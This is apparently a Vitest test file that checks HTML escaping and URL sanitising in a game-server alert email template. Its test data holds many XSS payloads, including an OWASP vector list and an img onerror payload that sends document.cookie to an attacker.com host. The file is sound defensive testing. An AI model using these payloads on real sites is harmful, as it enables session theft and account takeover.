/**
 * Tests for XSS Prevention in Alert Notification Email Templates
 *
 * These tests verify that:
 * - Game names are properly HTML-escaped in email templates
 * - Region parameters are properly HTML-escaped
 * - XSS payloads in dynamic content are neutralized
 * - URLs are properly sanitized
 *
 * Issue #13: HTML Injection in Email Templates
 *
 * @module alertNotification.xss.test
 */
import { describe, it, expect } from "vitest";
import { escapeHtml, sanitizeUrl, isSafeUrl } from "../lib/htmlUtils";

describe("Email Template XSS Prevention (Issue #13 Fix)", () => {
  describe("Game Name Escaping", () => {
    it("should escape script tags in game names", () => {
      const maliciousGameName = '<script>alert("XSS")</script>';
      const escaped = escapeHtml(maliciousGameName);

      // Simulate the email template
      const htmlBody = `<h2 style="color: #10b981;">${escaped} is back online!</h2>`;

      expect(htmlBody).not.toContain("<script>");
      expect(htmlBody).toContain("&lt;script&gt;");
    });

    it("should escape img onerror XSS in game names", () => {
      const maliciousGameName =
        '<img src=x onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">';
      const escaped = escapeHtml(maliciousGameName);

      const htmlBody = `<p>The ${escaped} servers are now online.</p>`;

      // Key security: the < and > are escaped, breaking the HTML tag structure
      expect(htmlBody).not.toContain("<img");
      expect(htmlBody).toContain("&lt;img");
      // The text "onerror" is present but it's not an executable attribute
      // because the img tag structure is broken
      expect(htmlBody).toContain("onerror");  // Text preserved, but safe
    });

    it("should escape SVG onload XSS in game names", () => {
      const maliciousGameName = '<svg onload="alert(1)">';
      const escaped = escapeHtml(maliciousGameName);

      const htmlBody = `<p>${escaped}</p>`;

      // Key security: the < and > are escaped, breaking the SVG tag structure
      expect(htmlBody).not.toContain("<svg");
      expect(htmlBody).toContain("&lt;svg");
      // The text "onload" is present but it's not an executable attribute
      expect(htmlBody).toContain("onload");  // Text preserved, but safe
    });

    it("should handle legitimate game names with special chars", () => {
      const legitimateNames = [
        "Tom Clancy's Rainbow Six",
        "Baldur's Gate 3",
        "C&C: Remastered",
        "Final Fantasy XIV: Dawntrail",
      ];

      for (const name of legitimateNames) {
        const escaped = escapeHtml(name);
        // These should be escaped but still readable
        expect(escaped.length).toBeGreaterThan(0);
        expect(escaped).not.toContain("<");
        expect(escaped).not.toContain(">");
      }
    });
  });

  describe("Region Parameter Escaping", () => {
    it("should escape XSS payloads in region parameter", () => {
      const maliciousRegion = '"><script>alert(1)</script><"';
      const escaped = escapeHtml(maliciousRegion.toUpperCase());

      const htmlBody = `<strong>${escaped}</strong> region`;

      expect(htmlBody).not.toContain("<script>");
      expect(htmlBody).not.toContain('"');
    });

    it("should safely handle normal region values", () => {
      const regions = ["na", "eu", "asia", "oce", "global"];

      for (const region of regions) {
        const escaped = escapeHtml(region.toUpperCase());
        expect(escaped).toBe(region.toUpperCase());
      }
    });
  });

  describe("URL Safety in Email Templates", () => {
    it("should reject javascript: protocol URLs", () => {
      const maliciousUrl = "javascript:alert(document.cookie)";
      expect(isSafeUrl(maliciousUrl)).toBe(false);
      expect(sanitizeUrl(maliciousUrl)).toBe("");
    });

    it("should reject data: protocol URLs", () => {
      const maliciousUrl = "data:text/html,<script>alert(1)</script>";
      expect(isSafeUrl(maliciousUrl)).toBe(false);
      expect(sanitizeUrl(maliciousUrl)).toBe("");
    });

    it("should allow https URLs", () => {
      const safeUrl = "https://gamestatus.app";
      expect(isSafeUrl(safeUrl)).toBe(true);
    });

    it("should escape special characters in safe URLs", () => {
      const url = "https://example.com/api?token=abc&foo=bar";
      const sanitized = sanitizeUrl(url);
      expect(sanitized).toContain("&amp;");
    });
  });

  describe("Full Email Template Simulation", () => {
    it("should produce safe HTML for email with malicious game name", () => {
      // Simulate the actual email template generation
      const gameName = '<script>steal(document.cookie)</script>';
      const region = "na";
      const timestamp = new Date().toISOString();
      const baseUrl = "https://gamestatus.app";
      const unsubscribeToken = "abc123";

      const safeGameName = escapeHtml(gameName);
      const safeRegion = escapeHtml(region.toUpperCase());
      const unsubscribeUrl = `${baseUrl}/api/unsubscribe?token=${encodeURIComponent(unsubscribeToken)}`;
      const dashboardUrl = sanitizeUrl(baseUrl) || "#";

      const htmlBody = `
        <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
          <h2 style="color: #10b981;">${safeGameName} is back online!</h2>
          <p>The ${safeGameName} servers in the <strong>${safeRegion}</strong> region are now online.</p>
          <p style="color: #666;">Status changed at: ${escapeHtml(timestamp)}</p>
          <p>
            <a href="${dashboardUrl}" style="display: inline-block; background-color: #6366f1; color: white; padding: 12px 24px; text-decoration: none; border-radius: 8px;">
              View Dashboard
            </a>
          </p>
          <hr style="border: none; border-top: 1px solid #eee; margin: 30px 0;" />
          <p style="color: #999; font-size: 12px;">
            You received this email because you subscribed to alerts for ${safeGameName}.
            <a href="${escapeHtml(unsubscribeUrl)}" style="color: #6366f1;">Unsubscribe</a>
          </p>
        </div>
      `;

      // Verify security
      expect(htmlBody).not.toContain("<script>");
      expect(htmlBody).not.toContain("</script>");
      expect(htmlBody).toContain("&lt;script&gt;");
      expect(htmlBody).toContain("&lt;&#x2F;script&gt;");

      // Verify readable structure maintained
      expect(htmlBody).toContain("is back online!");
      expect(htmlBody).toContain("View Dashboard");
      expect(htmlBody).toContain("Unsubscribe");
    });

    it("should produce safe HTML for email with attribute injection", () => {
      const gameName = '" onclick="alert(1)" data-x="';
      const region = "eu";

      const safeGameName = escapeHtml(gameName);
      const safeRegion = escapeHtml(region.toUpperCase());

      const htmlBody = `<p title="${safeGameName}">${safeGameName} - ${safeRegion}</p>`;

      // Verify no attribute injection possible
      expect(htmlBody).not.toContain('onclick="');
      expect(htmlBody).not.toContain('data-x="');
      expect(htmlBody).toContain("&quot;");
    });

    it("should handle all OWASP XSS attack vectors in game names", () => {
      // Common OWASP XSS test vectors
      const attackVectors = [
        '<IMG SRC="javascript:alert(\'XSS\');">',
        '<IMG SRC=javascript:alert(\'XSS\')>',
        '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
        '<IMG SRC=`javascript:alert("XSS")`>',
        '"><script>alert(document.domain)</script>',
        "'-alert(1)-'",
        '<body onload=alert(1)>',
        "<svg/onload=alert(1)>",
        '<iframe src="javascript:alert(1)">',
        '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
      ];

      for (const attack of attackVectors) {
        const escaped = escapeHtml(attack);

        // Key security: all < and > characters are escaped
        // This breaks HTML tag structure making payloads non-executable
        expect(escaped).not.toContain("<");
        expect(escaped).not.toContain(">");

        // Verify escaped versions are present
        if (attack.includes("<")) {
          expect(escaped).toContain("&lt;");
        }
        if (attack.includes(">")) {
          expect(escaped).toContain("&gt;");
        }
      }
    });
  });

  describe("Regression Prevention", () => {
    it("should not allow double-encoding bypass", () => {
      // Already-encoded payloads should still be safe
      const doubleEncoded = "&lt;script&gt;alert(1)&lt;/script&gt;";
      const escaped = escapeHtml(doubleEncoded);

      // The & symbols should be escaped again
      expect(escaped).toContain("&amp;lt;");
    });

    it("should handle null byte injection attempts", () => {
      const withNullByte = "<scr\x00ipt>alert(1)</script>";
      const escaped = escapeHtml(withNullByte);

      // Should still escape the < and >
      expect(escaped).not.toContain("<scr");
      expect(escaped).toContain("&lt;scr");
    });

    it("should handle unicode escape attempts", () => {
      const unicodeEscape = "\u003cscript\u003ealert(1)\u003c/script\u003e";
      const escaped = escapeHtml(unicodeEscape);

      // Unicode escapes are decoded by JS, so we should see escaped HTML
      expect(escaped).not.toContain("<script>");
      expect(escaped).toContain("&lt;script&gt;");
    });
  });
});

describe("Email Subject Line Security", () => {
  it("should handle XSS in subject (though less critical)", () => {
    // Email subjects typically don't render HTML, but we still validate
    const maliciousGameName = '<script>alert(1)</script>';
    const region = "na";

    // Subject uses raw values (not HTML context)
    const subject = `${maliciousGameName} is back online - ${region.toUpperCase()}`;

    // This is informational - subjects don't render HTML
    // But the raw payload would be visible
    expect(subject).toContain("<script>");
  });
});
